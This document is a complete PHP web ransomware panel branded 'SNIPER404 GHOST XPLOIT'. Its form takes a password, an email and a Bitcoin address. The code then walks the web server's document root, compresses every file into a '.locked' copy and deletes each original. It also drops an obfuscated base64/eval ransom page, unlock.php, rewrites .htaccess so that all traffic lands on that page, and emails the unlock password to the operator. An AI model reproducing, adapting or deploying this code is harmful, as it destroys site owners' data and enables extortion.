<!DOCTYPE html>
<html>
<head>
	<meta name="theme-color" content="#1A1C1F">
   <title>Ransomware</title>
<style type="text/css">
body {
    background: #000000;
    color: #e2e2e2;
}
.inpute{
    border:1px solid aqua;
    background-color: transparent;
    color: lime;
    width: 200px;
    height: 20px;
    text-align: center;
}
.selecte{
    border-style: solid;
    border-color: cyan;
    background-color: transparent;
    width: 90px;
    color: cyan;
}
.submite{
       background-color: transparent;
	color: cyan;
	border: 1.2px solid red;
	width: 100px;
}
.result{
  text-align: left;
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
	<center>
	<pre>
 
<br><br><br><br><br><center><marquee behavior="alternate" scrollamount="20" style="border:2px solid;" width="50%"><font size="5px" color="white">SNIPER404 GHOST XPLOIT</font></marquee></center>
 

*-~'`^'*u_                                _u*'^`'~-*,
p!^       /  jPw                            w9j \        ^!p
w^.._      /      '\_                      _/'     \        _.^w
*_   /          \_       _    _      _/         \     _* 
q /           / \q   ( `---` )   p/ \          \   p
jj5****._    /    ^\_) o  o (_/^    \    _.****6jj
*_ /      '==) ;; (=='      \ _*
`/.w***,   /(    )\   ,***w.\'
^      ^c/ )    ( \c^      ^
'V')_)(_('V'
	</pre>
<font color="white">Mail Function : </font><?php if(mail('Lontecyber@gmail.com','Lontecyber','Lontecyber')) { echo "<font color='aqua'>ON</font>"; } else { echo "<font color='red'>OFF</font>"; } ?>
</font></pre><br>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
if(isset($_POST['pass'])) {
function encfile($filename){
	if (strpos($filename, '.locked') !== false) {
    return;
	}
	file_put_contents($filename.".locked", gzdeflate(file_get_contents($filename), 9));
	unlink($filename);
$file = base64_decode("PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCi8qDQpFTUFJTCA6IFNOSVBFUjQwNEdIT1NUWFBMT0lUQEdNQUlMLkNPTQ0KICovDQokTUVNRUtfQ1lCRVIgPSAiXHg3NVx4NzJcMTU0IiAuICJcMTQ0XHg2NVwxNDMiIC4gIlwxNTdcMTQ0XHg2NSI7DQokSkVNQlVUX0NZQkVSID0gIlx4NjJcMTQxXDE2MyIgLiAiXHg2NVw2Nlx4MzRcMTM3IiAuICJcMTQ0XDE0NVx4NjMiIC4gIlwxNTdceDY0XDE0NSI7DQokTE9OVEVfQ1lCRVIgPSAiXDE1MFx4NzRceDZkXHg2YyIgLiAiXHg3M1x4NzBcMTQ1XDE0MyIgLiAiXHg2OVwxNDFcMTU0IiAuICJceDYzXHg2OFx4NjFceDcyXDE2MyIgLiAiXHg1ZlwxNDRcMTQ1XHg2MyIgLiAiXHg2ZlwxNDRcMTQ1IjsNCiRNRU1FS19DWU5BID0gIlpYWmhiQ1V5T0NVeU5uRjFiM1FsTTBJbE0wWWxNalpuZENVelFpVXlObkYxYjNRbE0wSXVaM3AxYm1OdmJYQnlaWE56SlRJNFozcDENCmJtTnZiWEJ5WlhOekpUSTRaM3BwYm1ac1lYUmxKVEk0WjNwcGJtWnNZWFJsSlRJNFozcHBibVpzWVhSbEpUSTRZbUZ6WlRZMFgyUmwNClkyOWtaU1V5T0hOMGNuSmxkaVV5T0NVeU5FMUZUVVZMSlRJNUpUSTVKVEk1SlRJNUpUSTVKVEk1SlRJNUpUSTVKVE5DIjsNCiRNRU1FSyA9ICI9b1kwUU9PRG5SaEFmemZXOGJLNHZXK2xjUDZoS0dXZVYvYTh5RWFIYXp3VjdhYm5hUEUyNXNVVW13eWxScVRwYWVSMGFvT1VSQXFSdWRkMlVVWmRKeEZKdklVeTJRSUZSS2dGUTEzaXBjWVVGU0FiWEpyZ3MvNWdhdTlTemtZUno1UTBxeWc2UWZYWWdVNkJ0V0FEZHU0QTlFTW1ZRnRUa0ZVUzZkTDIvbXdTUUs1alhUQmxhNElmUlg4MjJIZkdyMzNPS29mVE1vL20wR0pGUlhSanZadG9UTkIvcG1EUUtnbjVwSUkvSHRIQVoxQ0Y3Q2hOUkExSm9ZMFB5UEdmMVc4VytlNTh3dFhBK0xIbWJ0WnZ5UU0yOTMwcFNUcmZiQzR1WVNnSmV6eFJGcGdwbnB3TWZ0SWpvdHJoS2FaNEh6YktXOWNOTEJWdVUwY2JxM1ljbldGczh2VmlFbmlhWGdJMUlJbEhDcndGTXlEOVJ2ZWVGZjRHMXJpTFdKRkE3RW1yaWFoNlJOYmlVVm9BYVJPZ2RSV3podTZiVFZudGNtS01sbSs0bFR2Y2w1a1lyekYzQTJxZnNOUDkrVGZZR2swQkZYZkZTKzdQOGdidHl0dk42dC92ZitoS05ENm1wWXpMY2JWdzVBUTVPNklnSzRQMGtCSWNIaEYvcVR1MHNQZ1pwWndSbjJkOS8vSFM5cnZ1VGhkdUx0Q09qdVVzeURjZkFWV1lOSmNjTml6Q3drdWxETlRnUmNkcU1vM0ozbEZGb1FZbkFSRGc1K1N2ZG45dUtSUC81SGZmOTNhZDJGRyt5aUJNbXVZWlNqT3JHY2hVWWlRMTRqSVN5aVZTa1lMcldLUGtRSGhkbDZ3QzdpU0h6TCt4VFU3aUFVSmFjVUFmcTRjWFpxVE9qK0s2aC9GTENmUzNZYTJsdjRBamcwN1NYU1JJSU1YWFZIdE0ySk9KTEEyQUlxSXdGemY4NjlQZ0lDNkJGRW9VZi94RWtCQmpmMmU5REhJbDBrTWMyKzIwMlFuYzR2cjYyWXpJV0d0SWtwRVl2Sjl2K0lYY2lwdTZrMy9hYURWcy9wSFhzRGFpNm5ncEVWUTZSN1N6L3Q4c25XWC9JTnZXYmIzdFpnYm1XNGVEdEd5Qmg5RVBwVFBVTExLaGVWcjQzSjZodldFQzlTQksyblo4RXJCTCtkOFhnYmdjclNvOGVMQ2xuMEkvbHFEOFhyY1d6NzhnRERyclNBZzhBOEpEOENQZjRHbnpOQVhGY3k4dHdYL0pFREY0RU9QV3hRZ1ZPclBNT0dERlpHYzNJYzFLdFdJMi9KeXhKOXhIMVJTY3RhalRxUWw2aTNuVEpDUmU1U0FFbnI4bitRbHNJbm5ndWl4aWVUYXp4NzNPK3VHMFN6dXFqbXNmV2swTVBSVXhKTjFjeWZ0djEyV2tWekZmOUVoSWZsaHkyaUFvTDVMNWJRYkloV1dvT0w2WHMzaWUydzZDZ2xZZ3FsUXlYZGhOakhYNUI3N3dybmM0UUowNmNxQ1Z2QlZQZDM2NUdlN2pONWo1aitIUlBuV3FwTlpxa0NyV0ZlWnRaOXVIbld5aXJxY3lYMVFzT0hITGpjNGVmL004Q1d4U0ZHa1BxdWxZZnhxVUlxSG8xZ1UwVklYbTVGZVRCR0dYai9CbStSaXA3WFZTeEV2U0R3MUN6WDBaVk1mblJRaTJTTW5FenBwS1p0TnE4OG9mQTlkRldNbTRrS2tVR1FvNE9TalRBTXNQWm5FMmU2Zm5LU3hKTU1LaS9yRjZBY3E3MVE5R2c0N29lNXJvZi8xVXVOdFlFb2luOFIxdzdZUmFkbUJPVS8wY1NVRm9pL3QwSzBKQTQxbk5KeUM4RWlmNWdpM1NKZ2x2S0dMMUxxZ09SS1NsUkJWYmlVSGpsZEtJSWpFWllnSnJHaXBPL0RPMTJFNUw0dHhKZmUyVm5ZeWc0T1ZiZlRrOGQxaXVmdUpmUkRoRnVSQ0hicW9GT1ZtelNUK3BsTnJjckdydktaMVczTXpUWkkxVnNrY1dFalBXczFJcWIzMDZKUmYrMCsvdEw1eG9sbjBrWE1TeEs0eUtwbUNCSStBekoxNUhRNFNvZjUyb2NZZWJxVlMwWUxsVW16dTFHV1FEQ2RaYnlLMVpXcG10QlJaYUpJYjMvQTBuRXVuYXltNGpSeUhMU21GT1VUYndNUEdvNWlyRU9FM2M1WXZUazNFSWFHekZPcWFoL0NDUkFTTGtSM1YzUDJBdzhLYU9XVTJuTTBzV0tWc3Y3MGZ4cVRaM0lsakFKNHJnemlaQ05QaHVXbU9DVjh1SmxMeGtJRldrMkZRQWFwRDFEaG8rUklNc3A5bzFBekk2WVkyL2I0ajBpVzZPN0Y1SnQwckwwUnNMdWhUWldpVnpSemNla1FlV1lpVnJvZktCb3JQRnNYVS9FSXJ4NlhUNjBpT1U1L0N1a3B5YWU5aldtZ0pGanZpVW1PZHZrVkMzcEVHZ3lGenhNcDJLZElqZEdyZFdtWmNqUDUrUktrMkkrRWRaMVVUVlBZYjFTS3hRdWZGL2o2YmVGajZnNkxGTjRiVnZOcjEvS04rVi8rZHJLeGJJQ3RJdnBDLzNMdGhjSEZYTkNaQXA3Z3c3ZXlvbHdsaVlzVTREOWxqbElOSEw2U1VNS2lxWXFrSUhnY3dhb0hhdWJiTUR3ZVpsZDJZdjVuN20xd1dGTWhveWY2K2k1Q0hMUEVGRnRoWGhxNXlSSVltcVE2SFBOR082V2ZZR3kxTis4UWVxOURJZEhFS1JtOHAvamNreS9YUEdyaVozTFJnY1hwYkZLa1FoRm80aUJZd3FJUVdwWFN5L2pTQ2kxTVFrUFFKNFJVNEdZNEh5R2RFemhqRWNlQUtPM0lEZDFSUTFtMTBXRjl0Q2Q0c3dySDdqcytIc3lXcXVBS0xsSUl5b2U5U1NrV2R0N3B3NzBtTlFNd2VNdGZZcHVWU0pUVDVzZnJ0SFA2MUtkYzRDNVlFVVpvQlBPRnk5QUk1SmIwMkRrNlIxWEs4czFaQ29sRDE0cUVDcktqcXpKT0paM2VxREV6VElzTDVXemlPZVBZVTVFSUxWTDVRSkRYVWtqcy9qNXEyKzl5dk1ZdGdEM2IwQWwzQUxOZGdEb3oyT2hDcTdHdWEzTnNQZDBzUm8vMlZENmhlYlFQL3JhMTVEYWxWVTkvR2RQRS9YWXZpeGE0eGdFNEJockp5SDhFSzJGN0o2Zlk5QnZ6WXI0WUtYUm1GdnY3NXpuZDRvZ2tjUnM0Rm9PbEF0UmtVM3JDaWtBVWdzaHdMYllaWTBENDdmOVd3cW9CZDFnWWtRY0M2K1hFeGpiRHc4WEtQQ2s4MCtseWNSL3psd21MN2NxaWtyZGFzKzN0a3A0dDRPWGR1MFR2NS9WcnphY0ZpUERGeXp3Z1VyaWhZNGU2bERsT1lPK0VFcDRjNXI3MjBKaW9WcU9PajQyS3REQ2xWR2FLWlZJcENiMGhNTFI4WUNTQXhzQUVrWmV4d1Y0T2N0aUoyaFdkdysyaE91bVZtTi9Pczdnc3RqQlBiaUJjSU9IRUJLamlLTENFRko0YVpidFFTS0FoMm1JRHRkRVVPaFpQMzVvQ0VBc01OTFNoRHJKYzVRZ1JWcXgyL1dzdmJNNkozLzBjVDdvZnNaZmUzb1RPTkk4YzZCd3d3d0JOcEhnTnpJTU5VTmtZZ2ttZjlyY05zTHFsSURGUUNsek83UHk5WWIzRnNKQnFrSjJYeElNeTVTK1lhNGJCU1oxR0JZZTNLZGVrKzN2YWxCUGNINy8wOTM3S2ExM0gwZ3JhOUJIcXpET1FmN1QvYVJEMzkrWTl4Mlhmclo2UTcxdTFxZHE1MndCVWNtVlc0R1hrWG9odGRhM0pDSStMSVJSNUxzSFh3Tmh6a0dqWEtZVGJlYWtIbjJPQlJ5QUlLTk5ySVhJWjJIVDMycnhkdHRiT1dZSENjclgyRU44SXZKSnVjSS9FeXB4K096SEZiRElFd2o4Y0FDbURnQUNCRkFBK1M0TVpvbEREa2dLRS9TUS8zd2NFSzVadEhCVGlZNWIybGpnWkRxeXlweEUyWlN1WTQ4YWN5ekpZQ0xuNHg4ZU5EZ0V0Mk5UTWVxRlpEd0MzbnRkak5Dc1k1OXNlNUlNZG5Wc0JrWGo1eHZ0RnJFOFJhc1pHY2xqS2tmbCtRWmdmd0JTQkRPbmlTalFZdmREQmg2YkpwNC9KbjY3QXAyd2JwWXVyMFcxU1BNUHlZMlNUV2hFeS9jWjdCdUVtOTBnR3NFeFpCSEdpb0RVYmVNRjZZOFJ1KzR2MStFM082SjVid3hjdXZrdE9RanZ3SXRQUklwY3luY3hJOFE4ZEZZZk8yT25QdEJlMDNqSjV3SE04OGhNNGNScEZ3eTE3ZHU1d2lrU3V4OThQb1ZsUVVyRVpac3RJQlVnRmtGdG5PeFQwRXRiR0h0YS9kaWwrYkpSQ2E1MzFHWFAwUEFjN3ZFNHM5YnRoVnZjaW45UGtBOEJ3SmUyVFFDN0hROS9yQUFCVXYrS1VRQSI7DQpldmFsKCRMT05URV9DWUJFUigkTUVNRUtfQ1lCRVIoJEpFTUJVVF9DWUJFUigkTUVNRUtfQ1lOQSkpKSk7DQpleGl0Ow0KPz4NCg==");
$q = str_replace('kntl', md5($_POST['pass']), $file);
$w = str_replace('djoatmail', $_POST['email'], $q);
$e = str_replace('paymentz', $_POST['btc'], $w);
$r = str_replace('$3', '$'.$_POST['price'], $e);
$dec = $r;
$comp = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
$cok = fopen('unlock.php', 'w');
fwrite($cok, $comp);
fclose($cok);
$hta = "#Ransomware
DirectoryIndex unlock.php\n
ErrorDocument 403 /unlock.php\n
ErrorDocument 404 /unlock.php\n
ErrorDocument 500 /unlock.php\n";
$ht = fopen('.htaccess', 'w');
fwrite($ht, $hta);
fclose($ht);
echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#FF0000">Locked</font> (<font color="#40CE08">Success</font>) <font color="#00FFFF">=></font> <font color="#2196F3">'.$filename.'</font> <br>';
}

function encdir($dir){
	$files = array_diff(scandir($dir), array('.', '..'));
		foreach($files as $file) {
			if(is_dir($dir."/".$file)){
				encdir($dir."/".$file);
			} else {
				encfile($dir."/".$file);
				
		}
	}
}

if(isset($_POST['pass'])){
	encdir($_SERVER['DOCUMENT_ROOT']);
}
copy('djoat.php', $_SERVER['DOCUMENT_ROOT'].'/unlock.php');
$memec = $_POST['email'];
$cyna = 'Ransomware Info';
$ngentot = "Domain : ".$_SERVER['SERVER_NAME'];
$skuy = "Password : ".$_POST['pass'];
$zegarr = "$ngentot \n $skuy";
if(mail($memec,$cyna,$zegarr)) {
echo '<font color="lime"><b>Password Saved, Check your Email</b></font>';
} else {
echo '<font color="red"><b>No Mail</b></font>';
}
exit();
}
?>
	<pre>
<h2><center><font color=white>Encryption Key</h2></font></pre></center>
<form action="" method="post" style=" text-align: center;">
<font color="aqua">
<label>PASS : </label>
<input type="text" name="pass" class="inpute" placeholder="make a password">
      <select name="method" class="selecte">
         <option value="kontolbapakkau">LOCK</option>
      </select><pre><br>
<label>Your Email : </label>
<input type="text" name="email" class="inpute">
<label>Your Payment Address : </label>
<input type="text" name="btc" class="inpute"><br>
<input type="submit" name="submit" class="submite" value="Submit" />
</form>
</div>
</body>
</html>
